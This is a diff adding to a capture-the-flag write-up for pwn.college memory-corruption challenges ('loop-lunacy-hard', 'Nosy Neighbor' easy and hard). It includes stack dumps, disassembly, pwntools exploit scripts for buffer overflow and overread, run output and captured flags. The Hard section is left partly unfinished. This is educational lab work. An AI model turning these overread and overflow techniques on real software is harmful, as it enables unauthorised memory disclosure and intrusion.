@@ -4892,7 +4892,7 @@ We can see that the buffer is at `rbp-0x80` based on these instructions where th
 - [ ] Location of stored return address to `main()`
 - [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2128`
 
-Further in the program, there is this algorithm:
+Further in the program, there is this part:
 
 ```
 # ---- snip ----
@@ -4916,9 +4916,18 @@ Further in the program, there is this algorithm:
 # ---- snip ----
 ```
 
-- [x] Address of the buffer:: `rbp - 0x80`
-- [x] Address of variable `n`: `rbp - 0x80 + 0x6c`
-- [x] Location of stored return address to `main()`: `rbp - 0x8`
+The program takes the address of the memory location `rbp-0x80+0x6c` and stores that address into `rbp-0x88`.
+
+Then for the `read@plt` call, it does the following:
+- `mov rax, QWORD PTR [rbp-0x88]`: It gets the address of the counter, which is `rbp-0x14`, from it's pointer at `rbp-0x88`.
+- `mov eax, DWORD PTR [rax]`: It then gets the count from the counter at `rbp-0x14`. (This is your variable `n`).
+- `add rax, rdx:` It adds that counter value to the buffer start to find the exact spot for the read call.
+
+This tells us that the location of `n` is `rbp-0x80+0x6c` i.e. `rbp-0x14`.
+
+- [x] Address of the buffer:: `rbp-0x80`
+- [x] Address of variable `n`: `rbp-0x14`
+- [x] Location of stored return address to `main()`: `rbp-0x8`
 - [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2128`
 
 ### Exploit
@@ -4938,16 +4947,14 @@ while True:
     
     # Updated hardcoded addresses from your prompt
     buffer_addr = - 0x80      # rbp - 128
-    var_n_addr = - 0x80 + 0x6c      # rbp - 20 (This is -0x80 + 0x6c)
+    var_n_addr = - 0x14      # rbp - 20 (This is -0x80 + 0x6c)
     addr_of_saved_ip = 0x8   # rbp + 8
     
     # Calculate distances
     # Note: if var_n_addr < buffer_addr, the offset is negative!
     # Python's p8() handles signed integers, but let's calculate carefully.
     total_offset = addr_of_saved_ip - buffer_addr
-    # total_offset = 136
     var_n_offset = var_n_addr - buffer_addr
-    # var_n_offset = 108
     payload_size = total_offset + 2
 
     print(f"[+] Attempt {attempt} | Offsets: n={var_n_offset}, ret={total_offset}")
@@ -5017,4 +5024,385 @@ hacker@program-security~loop-lunacy-hard:/$ python ~/2_script.py
 Goodbye!
 You win! Here is your flag:
 pwn.college{UokbkvbtuMwdJiQwJAWD0ItCYFx.0lNwMDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Nosy Neighbor (Easy)
+
+```
+hacker@program-security~nosy-neighbor-easy:/$ /challenge/nosy-neighbor-easy 
+###
+### Welcome to /challenge/nosy-neighbor-easy!
+###
+
+The challenge() function has just been launched!
+Before we do anything, let's take a look at challenge()'s stack frame:
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fffeec29450 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29458 (rsp+0x0008) | 48 a7 c2 ee ff 7f 00 00 | 0x00007fffeec2a748 |
+| 0x00007fffeec29460 (rsp+0x0010) | 38 a7 c2 ee ff 7f 00 00 | 0x00007fffeec2a738 |
+| 0x00007fffeec29468 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
+| 0x00007fffeec29470 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29478 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29480 (rsp+0x0030) | 90 94 c2 ee ff 7f 00 00 | 0x00007fffeec29490 |
+| 0x00007fffeec29488 (rsp+0x0038) | f3 94 c2 ee ff 7f 00 00 | 0x00007fffeec294f3 |
+| 0x00007fffeec29490 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29498 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec294a0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec294a8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec294b0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec294b8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec294c0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec294c8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec294d0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec294d8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec294e0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec294e8 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec294f0 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec294f8 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29500 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29508 (rsp+0x00b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29510 (rsp+0x00c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29518 (rsp+0x00c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29520 (rsp+0x00d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29528 (rsp+0x00d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29530 (rsp+0x00e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29538 (rsp+0x00e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29540 (rsp+0x00f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29548 (rsp+0x00f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29550 (rsp+0x0100) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29558 (rsp+0x0108) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29560 (rsp+0x0110) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29568 (rsp+0x0118) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29570 (rsp+0x0120) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29578 (rsp+0x0128) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29580 (rsp+0x0130) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29588 (rsp+0x0138) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29590 (rsp+0x0140) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec29598 (rsp+0x0148) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec295a0 (rsp+0x0150) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec295a8 (rsp+0x0158) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec295b0 (rsp+0x0160) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec295b8 (rsp+0x0168) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec295c0 (rsp+0x0170) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec295c8 (rsp+0x0178) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec295d0 (rsp+0x0180) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec295d8 (rsp+0x0188) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec295e0 (rsp+0x0190) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec295e8 (rsp+0x0198) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fffeec295f0 (rsp+0x01a0) | 00 00 00 ee ff 7f 00 00 | 0x00007fffee000000 |
+| 0x00007fffeec295f8 (rsp+0x01a8) | 00 41 89 03 37 8c b0 82 | 0x82b08c3703894100 |
+| 0x00007fffeec29600 (rsp+0x01b0) | 40 a6 c2 ee ff 7f 00 00 | 0x00007fffeec2a640 |
+| 0x00007fffeec29608 (rsp+0x01b8) | 42 32 2c 01 ef 5a 00 00 | 0x00005aef012c3242 |
++---------------------------------+-------------------------+--------------------+
+Our stack pointer points to 0x7fffeec29450, and our base pointer points to 0x7fffeec29600.
+This means that we have (decimal) 56 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 448 bytes.
+The input buffer begins at 0x7fffeec29490, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 99 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
+
+In this level, the flag will be loaded into memory.
+However, at no point will this program actually print the buffer storing the flag.
+Payload size: 2
+You have chosen to send 2 bytes of input!
+This will allow you to write from 0x7fffeec29490 (the start of the input buffer)
+right up to (but not including) 0x7fffeec29492 (which is -97 bytes beyond the end of the buffer).
+Send your payload (up to 2 bytes)!
+aa
+You sent 2 bytes!
+The program's memory status:
+- the input buffer starts at 0x7fffeec29490
+- the saved frame pointer (of main) is at 0x7fffeec29600
+- the saved return address (previously to main) is at 0x7fffeec29608
+- the saved return address is now pointing to 0x5aef012c3242.
+- the canary is stored at 0x7fffeec295f8.
+- the canary value is now 0x82b08c3703894100.
+- the address of the flag is 0x7fffeec294f3.
+
+You said: aa
+Goodbye!
+### Goodbye!
+```
+
+The solution to this challenge is pretty easy.
+
+If we look at the addresses we have been provided with, we can see that the flag sits between the buffer and the stored return address. 
+
+```py title"~/script.py" showLineNumbers
+buffer_addr = 0x7ffd7c4a00e0
+canary_addr = 0x7ffd7c4a0248
+ret_addr = 0x7ffd7c4a0258
+flag_addr = 0x7ffd7c4a0143
+
+flag_dist = flag_addr - buffer_addr
+canary_dist = canary_addr - buffer_addr
+ret_dist = ret_addr - buffer_addr
+
+print(f"Flag dist: {flag_dist}")
+print(f"Canary dist: {canary_dist}")
+print(f"Return dist: {ret_dist}")
+```
+
+```
+hacker@program-security~nosy-neighbor-easy:/$ python ~/script.py 
+Flag dist: 99
+Canary dist: 360
+Return dist: 376
+```
+
+### Buffer Overread
+
+This means, we do not have to overflow the buffer at all. Our payload just has to touch the stored flag, and then `printf` will read the entire string from the start of our buffer until it finds a `\x00` byte, which will be after the flag.
+
+So, it will print out the flag as well for us.
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process('/challenge/nosy-neighbor-easy')
+
+# Initialize values
+buffer_addr = 0x7ffd7c4a00e0
+flag_addr = 0x7ffd7c4a0143
+
+# Calculate offset & payload_size
+offset = flag_addr - buffer_addr
+payload_size = offset
+
+# Build payload
+payload = b"A" * offset
+
+# Send payload size
+p.recvuntil(b'Payload size: ')
+p.sendline(str(payload_size).encode())
+
+# Send payload
+p.recvuntil(b'bytes)!')
+p.send(payload)
+
+p.interactive() 
+```
+
+```
+hacker@program-security~nosy-neighbor-easy:/$ python ~/script.py 
+[+] Starting local process '/challenge/nosy-neighbor-easy': pid 43439
+[*] Switching to interactive mode
+
+[*] Process '/challenge/nosy-neighbor-easy' stopped with exit code 0 (pid 43439)
+You sent 99 bytes!
+The program's memory status:
+- the input buffer starts at 0x7ffdf25c3520
+- the saved frame pointer (of main) is at 0x7ffdf25c3690
+- the saved return address (previously to main) is at 0x7ffdf25c3698
+- the saved return address is now pointing to 0x5a06c7f98242.
+- the canary is stored at 0x7ffdf25c3688.
+- the canary value is now 0xe7737175eb0e8e00.
+- the address of the flag is 0x7ffdf25c3583.
+
+You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwn.college{o7qHRXYqxzUogFkCRk_p8XP5YEH.01NwMDL4ITM0EzW}
+
+Goodbye!
+### Goodbye!
+[*] Got EOF while reading in interactive
+$  
+```
+
+&nbsp;
+
+## Nosy Neighbor (Hard)
+
+```
+hacker@program-security~nosy-neighbor-hard:/$ /challenge/nosy-neighbor-hard 
+###
+### Welcome to /challenge/nosy-neighbor-hard!
+###
+
+Payload size: 2
+Send your payload (up to 2 bytes)!
+aa
+You said: aa
+Goodbye!
+### Goodbye!
+```
+
+We will need the following for crafting an exploit:
+
+- [ ] Location of buffer
+- [ ] Location of flag
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x00000000000010e0  __cxa_finalize@plt
+0x00000000000010f0  putchar@plt
+0x0000000000001100  __errno_location@plt
+0x0000000000001110  puts@plt
+0x0000000000001120  __stack_chk_fail@plt
+0x0000000000001130  printf@plt
+0x0000000000001140  read@plt
+0x0000000000001150  setvbuf@plt
+0x0000000000001160  open@plt
+0x0000000000001170  __isoc99_scanf@plt
+0x0000000000001180  exit@plt
+0x0000000000001190  strerror@plt
+0x00000000000011a0  _start
+0x00000000000011d0  deregister_tm_clones
+0x0000000000001200  register_tm_clones
+0x0000000000001240  __do_global_dtors_aux
+0x0000000000001280  frame_dummy
+0x0000000000001289  bin_padding
+0x00000000000016bb  challenge
+0x0000000000001845  main
+0x0000000000001950  __libc_csu_init
+0x00000000000019c0  __libc_csu_fini
+0x00000000000019c8  _fini
+```
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x00000000000016bb <+0>:     endbr64
+   0x00000000000016bf <+4>:     push   rbp
+   0x00000000000016c0 <+5>:     mov    rbp,rsp
+   0x00000000000016c3 <+8>:     sub    rsp,0x1b0
+   0x00000000000016ca <+15>:    mov    DWORD PTR [rbp-0x194],edi
+   0x00000000000016d0 <+21>:    mov    QWORD PTR [rbp-0x1a0],rsi
+   0x00000000000016d7 <+28>:    mov    QWORD PTR [rbp-0x1a8],rdx
+   0x00000000000016de <+35>:    mov    rax,QWORD PTR fs:0x28
+   0x00000000000016e7 <+44>:    mov    QWORD PTR [rbp-0x8],rax
+   0x00000000000016eb <+48>:    xor    eax,eax
+   0x00000000000016ed <+50>:    lea    rdx,[rbp-0x170]
+   0x00000000000016f4 <+57>:    mov    eax,0x0
+   0x00000000000016f9 <+62>:    mov    ecx,0x2b
+   0x00000000000016fe <+67>:    mov    rdi,rdx
+   0x0000000000001701 <+70>:    rep stos QWORD PTR es:[rdi],rax
+   0x0000000000001704 <+73>:    mov    rdx,rdi
+   0x0000000000001707 <+76>:    mov    DWORD PTR [rdx],eax
+   0x0000000000001709 <+78>:    add    rdx,0x4
+   0x000000000000170d <+82>:    lea    rax,[rbp-0x170]
+   0x0000000000001714 <+89>:    mov    QWORD PTR [rbp-0x180],rax
+   0x000000000000171b <+96>:    lea    rax,[rbp-0x170]
+   0x0000000000001722 <+103>:   add    rax,0x5c
+   0x0000000000001726 <+107>:   mov    QWORD PTR [rbp-0x178],rax
+   0x000000000000172d <+114>:   mov    QWORD PTR [rbp-0x188],0x0
+   0x0000000000001738 <+125>:   mov    esi,0x0
+   0x000000000000173d <+130>:   lea    rdi,[rip+0x8c4]        # 0x2008
+   0x0000000000001744 <+137>:   mov    eax,0x0
+   0x0000000000001749 <+142>:   call   0x1160 <open@plt>
+   0x000000000000174e <+147>:   mov    ecx,eax
+   0x0000000000001750 <+149>:   mov    rax,QWORD PTR [rbp-0x178]
+   0x0000000000001757 <+156>:   mov    edx,0x100
+   0x000000000000175c <+161>:   mov    rsi,rax
+   0x000000000000175f <+164>:   mov    edi,ecx
+   0x0000000000001761 <+166>:   call   0x1140 <read@plt>
+   0x0000000000001766 <+171>:   lea    rdi,[rip+0x8a1]        # 0x200e
+   0x000000000000176d <+178>:   mov    eax,0x0
+   0x0000000000001772 <+183>:   call   0x1130 <printf@plt>
+   0x0000000000001777 <+188>:   lea    rax,[rbp-0x188]
+   0x000000000000177e <+195>:   mov    rsi,rax
+   0x0000000000001781 <+198>:   lea    rdi,[rip+0x895]        # 0x201d
+   0x0000000000001788 <+205>:   mov    eax,0x0
+   0x000000000000178d <+210>:   call   0x1170 <__isoc99_scanf@plt>
+   0x0000000000001792 <+215>:   mov    rax,QWORD PTR [rbp-0x188]
+   0x0000000000001799 <+222>:   mov    rsi,rax
+   0x000000000000179c <+225>:   lea    rdi,[rip+0x885]        # 0x2028
+   0x00000000000017a3 <+232>:   mov    eax,0x0
+   0x00000000000017a8 <+237>:   call   0x1130 <printf@plt>
+   0x00000000000017ad <+242>:   mov    rdx,QWORD PTR [rbp-0x188]
+   0x00000000000017b4 <+249>:   mov    rax,QWORD PTR [rbp-0x180]
+   0x00000000000017bb <+256>:   mov    rsi,rax
+   0x00000000000017be <+259>:   mov    edi,0x0
+   0x00000000000017c3 <+264>:   call   0x1140 <read@plt>
+   0x00000000000017c8 <+269>:   mov    DWORD PTR [rbp-0x18c],eax
+   0x00000000000017ce <+275>:   cmp    DWORD PTR [rbp-0x18c],0x0
+   0x00000000000017d5 <+282>:   jns    0x1803 <challenge+328>
+   0x00000000000017d7 <+284>:   call   0x1100 <__errno_location@plt>
+   0x00000000000017dc <+289>:   mov    eax,DWORD PTR [rax]
+   0x00000000000017de <+291>:   mov    edi,eax
+   0x00000000000017e0 <+293>:   call   0x1190 <strerror@plt>
+   0x00000000000017e5 <+298>:   mov    rsi,rax
+   0x00000000000017e8 <+301>:   lea    rdi,[rip+0x861]        # 0x2050
+   0x00000000000017ef <+308>:   mov    eax,0x0
+   0x00000000000017f4 <+313>:   call   0x1130 <printf@plt>
+   0x00000000000017f9 <+318>:   mov    edi,0x1
+   0x00000000000017fe <+323>:   call   0x1180 <exit@plt>
+   0x0000000000001803 <+328>:   mov    rax,QWORD PTR [rbp-0x180]
+   0x000000000000180a <+335>:   mov    rsi,rax
+   0x000000000000180d <+338>:   lea    rdi,[rip+0x860]        # 0x2074
+   0x0000000000001814 <+345>:   mov    eax,0x0
+   0x0000000000001819 <+350>:   call   0x1130 <printf@plt>
+   0x000000000000181e <+355>:   lea    rdi,[rip+0x85d]        # 0x2082
+   0x0000000000001825 <+362>:   call   0x1110 <puts@plt>
+   0x000000000000182a <+367>:   mov    eax,0x0
+   0x000000000000182f <+372>:   mov    rcx,QWORD PTR [rbp-0x8]
+   0x0000000000001833 <+376>:   xor    rcx,QWORD PTR fs:0x28
+   0x000000000000183c <+385>:   je     0x1843 <challenge+392>
+   0x000000000000183e <+387>:   call   0x1120 <__stack_chk_fail@plt>
+   0x0000000000001843 <+392>:   leave
+   0x0000000000001844 <+393>:   ret
+End of assembler dump.
+```
+
+
+rbp-0x170
+rbp-0x178
+
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process('/challenge/nosy-neighbor-hard')
+
+# Initialize values
+buffer_addr = 0x7ffcd77474e0
+flag_addr = 0x7ffcd774753c
+
+# Calculate offset & payload_size
+offset = flag_addr - buffer_addr
+payload_size = offset
+
+# Build payload
+payload = b"A" * offset
+
+# Send payload size
+p.recvuntil(b'Payload size: ')
+p.sendline(str(payload_size).encode())
+
+# Send payload
+p.recvuntil(b'bytes)!')
+p.send(payload)
+
+p.interactive() 
+```
+
+```
+hacker@program-security~nosy-neighbor-hard:/$ python ~/script.py 
+[+] Starting local process '/challenge/nosy-neighbor-hard': pid 1970
+[*] Switching to interactive mode
+
+[*] Process '/challenge/nosy-neighbor-hard' stopped with exit code 0 (pid 1970)
+You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwn.college{seHXRAHm8puywEDXYRQy1e9CkQK.0FOwMDL4ITM0EzW}
+
+Goodbye!
+### Goodbye!
+[*] Got EOF while reading in interactive
+$  
 ```
